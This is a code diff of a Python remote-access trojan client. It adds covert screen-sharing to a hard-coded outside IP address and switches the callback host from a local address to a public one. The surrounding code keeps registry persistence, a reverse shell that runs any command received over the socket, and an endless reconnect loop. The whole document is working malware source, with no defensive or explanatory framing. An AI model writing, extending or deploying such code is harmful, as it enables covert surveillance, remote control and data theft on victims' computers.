@@ -8,6 +8,13 @@ import threading
 import shutil
 import sys
 import time
+from vidstream import ScreenShareClient
+
+# Connection data
+HOST = '188.251.33.6'
+PORT = 5555
+STREAMING_PORT = 9999
+streamFlag = 0
 
 def send(data):
     jsonData = json.dumps(data)
@@ -72,7 +79,23 @@ def persist(regName, copyName):
     except:
         send('[-] Error: Unable to create persistence')
 
+# Start screensharing
+def screenShare():
+
+    sender = ScreenShareClient(HOST, STREAMING_PORT)
+    t = threading.Thread(target=sender.start_stream)
+
+    t.start()
+
+    while not recv().startswith('stream-stop'):
+        continue
+
+    sender.stop_stream()
+
 def shell():
+
+    global streamFlag
+
     while True:
 
         command = recv()
@@ -119,6 +142,9 @@ def shell():
             regName, copyName = command[12:].split(' ')
             persist(regName, copyName)
 
+        elif command.startswith('stream-start'):
+            screenShare()
+
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
@@ -126,14 +152,10 @@ def shell():
             result = result.decode('latin-1')
             send(result)
 
-# Connection data
-HOST = '192.168.1.110'
-PORT = 5555
-
 # Retry connection every 20 seconds forever until the connection is astablished
 def connection():
     while True:
-        time.sleep(15)
+        time.sleep(20)
 
         try: 
             s.connect((HOST, PORT))
@@ -142,7 +164,7 @@ def connection():
             break
 
         except:
-            pass
+            connection()
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
